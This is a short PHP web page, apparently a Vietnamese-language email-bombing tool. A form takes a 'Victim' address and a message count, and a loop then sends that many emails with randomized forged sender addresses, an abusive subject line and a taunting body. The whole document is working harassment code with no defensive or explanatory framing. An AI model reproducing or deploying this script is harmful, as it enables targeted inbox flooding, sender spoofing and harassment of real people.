<html>
<body><center>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" name="bom">
Victim:<input name="mail" type=""text"><br>
Số lượng: <input name="soluong" type="text"><br>
<input type="submit" name="submit" value="Bom">
<?php function rand_string($length) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";    
    $size = strlen( $chars );
    for( $i = 0; $i < $length; $i++ ) {
        $str .= $chars[ rand( 0, $size - 1 ) ];
    }
    return $str;
}$mail=$_POST['mail'];$soluong=$_POST['soluong'];$i=1;
If ($_POST['submit']){
While ($i<=$soluong){$content=rand_string(100)." - Password để ngừng bom mail: ". md5(rand_string(10));$subject="Fuck you - ".rand_string(10). " - " .md5(rand_string(10));$mailfrom="BYG-".rand_string(8)."@".rand_string(6).".com";$header="From: $mailfrom<$mailfrom>" . "\r\n" .
              "X-Mailer: PHP/" . phpversion();mail($mail,$subject,$content,$header);$i++;
echo $i." ".$mailfrom." - ".$mail."<br>";
}
}?></form>
</center></body>
</html>